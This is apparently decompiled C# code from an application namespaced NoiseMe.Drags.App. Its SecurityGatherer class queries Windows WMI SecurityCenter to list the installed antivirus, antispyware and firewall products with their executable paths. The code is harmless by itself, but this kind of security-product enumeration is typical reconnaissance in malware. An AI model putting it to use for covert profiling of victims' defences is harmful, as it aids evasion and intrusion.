using System;
using System.Collections.Generic;
using System.Management;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x02000174 RID: 372
	public static class SecurityGatherer
	{
		// Token: 0x06000C11 RID: 3089 RVA: 0x000240DC File Offset: 0x000222DC
		static SecurityGatherer()
		{
			bool flag = Environment.OSVersion.Platform == PlatformID.Win32NT;
			bool flag2 = Environment.OSVersion.Version.Major >= 6;
			SecurityGatherer.SecurityScope = ((flag && flag2) ? "ROOT\\SecurityCenter2" : "ROOT\\SecurityCenter");
		}

		// Token: 0x06000C12 RID: 3090 RVA: 0x00024124 File Offset: 0x00022324
		public static ICollection<SecurityProduct> GetSecurityProducts(SecurityProductType productType)
		{
			List<SecurityProduct> list = new List<SecurityProduct>();
			ManagementScope scope = new ManagementScope(SecurityGatherer.SecurityScope);
			string[] properties = new string[]
			{
				"displayName",
				"pathToSignedProductExe"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection;
			switch (productType)
			{
			case SecurityProductType.AntiVirus:
				wmiInstanceClassCollection = WmiInstance.Query("AntivirusProduct", properties, scope);
				break;
			case SecurityProductType.AntiSpyware:
				wmiInstanceClassCollection = WmiInstance.Query("AntiSpyWareProduct", properties, scope);
				break;
			case SecurityProductType.Firewall:
				wmiInstanceClassCollection = WmiInstance.Query("FirewallProduct", properties, scope);
				break;
			default:
				wmiInstanceClassCollection = null;
				break;
			}
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				SecurityProduct item = new SecurityProduct((string)wmiInstanceClass["displayName"].Value, (string)wmiInstanceClass["pathToSignedProductExe"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x040004A2 RID: 1186
		private static string SecurityScope;
	}
}
